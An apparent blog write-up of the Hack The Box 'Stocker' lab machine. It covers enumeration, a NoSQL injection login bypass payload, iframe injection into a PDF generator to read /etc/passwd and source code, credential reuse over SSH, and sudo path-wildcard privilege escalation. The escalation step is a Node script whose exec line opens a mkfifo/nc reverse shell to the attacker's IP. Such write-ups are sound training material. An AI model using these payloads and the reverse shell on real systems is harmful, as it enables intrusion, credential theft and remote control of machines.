---
title: HTB - Stocker
author: nirajkharel
date: 2023-06-24 14:10:00 +0800
categories: [HackTheBox]
tags: [HTB, HackTheBox]
render_with_liquid: false
---


HTB — Stocker
================

It is an easy machine in Hack The Box. It contains vulnerabilities like NoSQL Injection, File Inclusion on PDF conversion and Credential reuse.

![](https://cdn-images-1.medium.com/max/3704/1*yYN_tRZMCx4yY42WaE2dLA.png)

## Enumeration

### NMAP

Disable the ping scan with -Pn and scan the box

    sudo nmap -Pn -sC -sV -oA nmap/10.10.11.196 10.10.11.196 -vv
    
    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/Jyuj3D7FuZQdudxWlH081Q6WkdTVz6G05mFSFpBpycfOrwuJpQ6oJV1I4J6UeXg+o5xHSm+ANLhYEI6T/JMnYSyEmVq/QVactDs9ixhi+j0R0rUrYYgteX7XuOT2g4ivyp1zKQP1uKYF2lGVnrcvX4a6ds4FS8mkM2o74qeZj6XfUiCYdPSVJmFjX/TgTzXYHt7kHj0vLtMG63sxXQDVLC5NwLs3VE61qD4KmhCfu+9viOBvA1ZID4Bmw8vgi0b5FfQASbtkylpRxdOEyUxGZ1dbcJzT+wGEhalvlQl9CirZLPMBn4YMC86okK/Kc0Wv+X/lC+4UehL//U3MkD9XF3yTmq+UVF/qJTrs9Y15lUOu3bJ9kpP9VDbA6NNGi1HdLyO4CbtifsWblmmoRWIr+U8B2wP/D9whWGwRJPBBwTJWZvxvZz3llRQhq/8Np0374iHWIEG+k9U9Am6rFKBgGlPUcf6Mg7w4AFLiFEQaQFRpEbf+xtS1YMLLqpg3qB0=
    |   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgPXCNqX65/kNxcEEVPqpV7du+KsPJokAydK/wx1GqHpuUm3lLjMuLOnGFInSYGKlCK1MLtoCX6DjVwx6nWZ5w=
    |   256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDyp1s8jG+rEbfeqAQbCqJw5+Y+T17PRzOcYd+W32hF
    80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://stocker.htb
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Add 10.10.11.196 as stocker.htb on /etc/hosts. Open [http://stocker.htb](http://stocker.htb) on a browser. Analyze the source code if you want.

## Directory Enumeration

### Dirsearch

    dirsearch -u http://stocker.htb                                                                                                                    
                                                                                          
                                                                                                                                                             
      _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                         
     (_||| _) (/_(_|| (_| )                                                                                                                                  
                                                                                                                                                             
    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903                                                             
                                                                                                                                                             
    Output File: /usr/lib/python3/dist-packages/dirsearch/reports/stocker.htb/_23-01-31_22-43-19.txt                                                         
                                                                                                                                                             
    Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-01-31_22-43-19.log                                                                    
                                                                                                                                                             
    Target: http://stocker.htb/                                                                                                                              
                                                                                                                                                             
    [22:43:19] Starting:                                                                                                                                     
    [22:43:20] 301 -  178B  - /js  ->  http://stocker.htb/js/                                                                                                
    [22:43:51] 301 -  178B  - /css  ->  http://stocker.htb/css/                                                                                              
    [22:43:55] 200 -    1KB - /favicon.ico                                                                                                                   
    [22:43:55] 301 -  178B  - /fonts  ->  http://stocker.htb/fonts/                                                                                          
    [22:43:57] 301 -  178B  - /img  ->  http://stocker.htb/img/                                                                                              
    [22:43:58] 200 -   15KB - /index.html                                                                                                                    
    [22:43:59] 403 -  564B  - /js/  

Didn’t found anything interesting here.

## Subdomain Enumeration

On enumerating the subdomains with ffuf, a new subdomain dev was discovered as shown below.

    ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://stocker.htb/ -H "Host: FUZZ.stocker.htb" -fw 6
    
            /'___\  /'___\           /'___\       
           /\ \__/ /\ \__/  __  __  /\ \__/       
           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
             \ \_\   \ \_\  \ \____/  \ \_\       
              \/_/    \/_/   \/___/    \/_/       
    
           v1.5.0-dev
    ________________________________________________
    
     :: Method           : GET
     :: URL              : http://stocker.htb/
     :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
     :: Header           : Host: FUZZ.stocker.htb
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
     :: Filter           : Response words: 6
    ________________________________________________
    
    dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 138ms]
    :: Progress: [19966/19966] :: Job [1/1] :: 391 req/sec :: Duration: [0:00:52] :: Errors: 0 ::

Add dev.stocker.htb on /etc/hosts.

![](https://cdn-images-1.medium.com/max/2000/1*laUu_WgrECMPleHKT8_zQA.png)

Open the URL [http://dev.stocker.htb](http://dev.stocker.htb) on a browser, we can see a login panel.

![](https://cdn-images-1.medium.com/max/2374/1*mh0fTR46ygAsRl1-HLBM3g.png)

Let’s enumerate the directories on this subdomain.

    gobuster dir -u http://dev.stocker.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
    
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://dev.stocker.htb
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Timeout:                 10s
    ===============================================================
    2023/01/31 22:57:26 Starting gobuster in directory enumeration mode
    ===============================================================
    /login                (Status: 200) [Size: 2667]
    /static               (Status: 301) [Size: 179] [--> /static/]
    /Login                (Status: 200) [Size: 2667]              
    /logout               (Status: 302) [Size: 28] [--> /login]   
    /stock                (Status: 302) [Size: 48] [--> /login?error=auth-required]
    /Logout               (Status: 302) [Size: 28] [--> /login]                    
    /Static               (Status: 301) [Size: 179] [--> /Static/] 

We can see an interesting directory /stock which has slightly different error message which shows that the directory is valid but auth is required inorder to access it.

Viewing the source code, we can see that if the application responds with two kinds of errors ‘login-failed’ and ‘auth-required’ which has two different messages for each.

![](https://cdn-images-1.medium.com/max/2000/1*SRSRa8Ryo0ep3dVs_hTB8w.png)

But was not able to do anything since the application was redirecting to /login anyways.

![](https://cdn-images-1.medium.com/max/2198/1*L2xMHUVgFAtW32JrlZgTbw.png)

On viewing the source code again, we can see that the application might be disclosing a username in a placeholder.

![](https://cdn-images-1.medium.com/max/2000/1*ZMXj-7080qqgTbvyTJIsYw.png)

Tried a bunch of brute force attacks using username jsmith but was not successful. Also I performed bunch of SQLi techniques on the login request but non of them worked. No any SQL or No SQL? This attack is what we miss more in regular pentest.

## Initial Foothold

### No SQL

Let’s try if we could perform No SQL injection on the login request. There are bunch of script to exploit No SQL Injection. Since we need to access /stock directory, let’s try if we could perform authentication bypass.

Download the script: [https://github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)

    git clone https://github.com/C4l1b4n/NoSQL-Attack-Suite.git
    cd NoSQL-Attack-Suite
    
    # It will try bunch of No SQLi payloads on username and password parameter in provided URL.
    python3 nosql-login-bypass.py -t http://dev.stocker.htb -u username -p password
    
    [*] Checking for auth bypass GET request...
    [-] Login is probably NOT vulnerable to GET request auth bypass...
    
    [*] Checking for auth bypass POST request...
    [-] Login is probably NOT vulnerable to POST request auth bypass...
    
    [*] Checking for auth bypass POST JSON request...
    [+] Login is probably VULNERABLE to POST JSON request auth bypass!
    [!] PAYLOAD: {"username": {"$ne": "dummyusername123"}, "password": {"$ne": "dummypassword123"}}

We can see that the Login form is vulnerable to NoSQLi auth bypass. Let’s try to exploit further it manually since we got our payload. For this, we need to change the Content-Type to application/json on the Login request as well.

![](https://cdn-images-1.medium.com/max/2184/1*1c6R3vRiLb5J1vOn8cMi9w.png)

We can see that we have been authenticated. Let’s open the response on a browser and we are logged in.

![](https://cdn-images-1.medium.com/max/2538/1*tScqSMWkufc7om02AeOGWw.png)

When we view the source code of the application, we can find three interesting endpoints **/api/products**, **/api/order/** and **/api/order/po**.

**/api/products/** — This endpoint lists the available product information on the application

![](https://cdn-images-1.medium.com/max/2000/1*IsFkbKGxeyV55Xn9yvd33A.png)

As we can see on the source code, on the /api/product code snippet, we can find a list basket defined which comprises of all the element on /api/product API as shown on above image and a amount parameter is added on it, which makes basket’s value as

    basket=[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]

**/api/order/ —** which accepts POST request. We can post the order in this request which responds with the order ID if the body parameters are correct. We can see that the basket value above is converted into JSON and passed as body in /api/order/ request.

![](https://cdn-images-1.medium.com/max/2000/1*-cRwmRhA7qzf6RZKw0_Omw.png)

Which makes our body parameter as:

    {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}

Let’s craft a request in burp now. Know that the session need to be authenticated here.

![](https://cdn-images-1.medium.com/max/2000/1*bB2d8DQSMeTDK3n7bZP8yA.png)

Now here comes the part of /api/order/po API, as we can see on the below image, after a successful order, we can receive order Id on the response which can be viewed by appending it into the /api/order/po API.

![](https://cdn-images-1.medium.com/max/2000/1*lAiUYfT8BSKa61wh8yIBbA.png)

Let’s open /api/order/po/63dbde7bd2ab6f1540a63555 on the browser. The server converts the requested data into PDF and reflects back to us via order ID.

![](https://cdn-images-1.medium.com/max/2000/1*w-nHc28k-LhvL6jtEvGUxQ.png)

Also, we can see that the value of title parameter from the requested is reflected back on the PDF. If we could inject the XSS payload on it, we could exfiltrate the data on PDF.

More resources on XSS to Data Exfiltration on PDF
[XSS to Exfiltrate Data from PDFs](https://medium.com/r3d-buck3t/xss-to-exfiltrate-data-from-pdfs-f5bbb35eaba7)

[Portable Data exFiltration: XSS for PDFs
](https://portswigger.net/research/portable-data-exfiltration)

Tried the bunch of XSS payload, but the execution was not successfull. On trying the `<iframe>` payload, I was able to execute the payload on PDF.

Found a payload here.
[Iframes in XSS, CSP and SOP](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp)

I have modified the payload to that it would not break the JSON format

      <iframe id='if4' src='data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E'></iframe>

![](https://cdn-images-1.medium.com/max/2000/1*JZG7jq8Aa7eATJV0PMeVhg.png)

![](https://cdn-images-1.medium.com/max/2000/1*QqwWyXDNtoMcLtcSQSlgFw.png)

Let’s try to view the /etc/passwd content.

![](https://cdn-images-1.medium.com/max/2000/1*tzqMV9BbowzRagZB2WeQPg.png)

We are able to exfiltrate the data from it since we can view the /etc/passwd and we can also see the user angoose who can execute the bash shell on the system.

![](https://cdn-images-1.medium.com/max/2000/1*1rkeksGJdYIhXGIDv7PB-A.png)

As we confirmed LFI, we need to find the internal path inorder to access other sensitive information. Let’s talk about internal path disclosure here. We often ignore this issue on a regular pen testing, but internal path disclosure can aid much in other attacks like File Inclusion, Path Traversal and SQL Injection. In this case we can view the web root path of the application which is /var/www/dev.

![](https://cdn-images-1.medium.com/max/2222/1*ncp2dW7uutrBsz85GNVO5g.png)

Tried bunch of HTML, JS, CONF file on `/var/ww/dev/` endpoint but eventually the path `/var/www/dev/`index.js was successful.

![](https://cdn-images-1.medium.com/max/2000/1*6SlCyi1yHzIQ5Mqc3icC-A.png)

Let’s try to view the information of index.js file in which we can view the Mongo DB credentials. Let’s see if the server has credential reuse vulnerability. Often we find credential re-use issue on real world environment as well as most of the password are shared on different accounts or services.

![](https://cdn-images-1.medium.com/max/2032/1*N5v_v1y5IR6mlYEGpXmqzA.png)

Since we have a username angoose, SSH into the machine with above password.

![](https://cdn-images-1.medium.com/max/2000/1*PqzZQ9DsDK6734OrxGSKkw.png)

And, we can find the user flag here.

## Privilege Escalation

Let’s see if we can run any command as sudo using *sudo -l*

![](https://cdn-images-1.medium.com/max/2138/1*DUa1XNpOBx4smGWk1ZqVJA.png)

We can see that the user angoose can run the node script with sudo permission. Let’s create a script on a node which performs reverse shell on our machine.

We can take a reference from here that how can we execute system commands in Node.

[https://stackabuse.com/executing-shell-commands-with-node-js/](https://stackabuse.com/executing-shell-commands-with-node-js/)

    const { exec } = require("child_process");
    
    exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1337 >/tmp/f", (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });

But we don’t have write permission on the directory.

![](https://cdn-images-1.medium.com/max/2000/1*swjbnXptfxXQOKmoStnUhQ.png)

Also we can see that there is a wildcard on the script path which means we can inject the path as well. Let’s create the node JS file on the /tmp/ directory and inject in the command.

![](https://cdn-images-1.medium.com/max/2088/1*SDFnN9_6o4xIeUpXw_PT_w.png)

Execute the command.

![](https://cdn-images-1.medium.com/max/2528/1*0XvZFN3k4-eTUZbG7HqYkA.png)

Here you go. Happy Hacking!!!

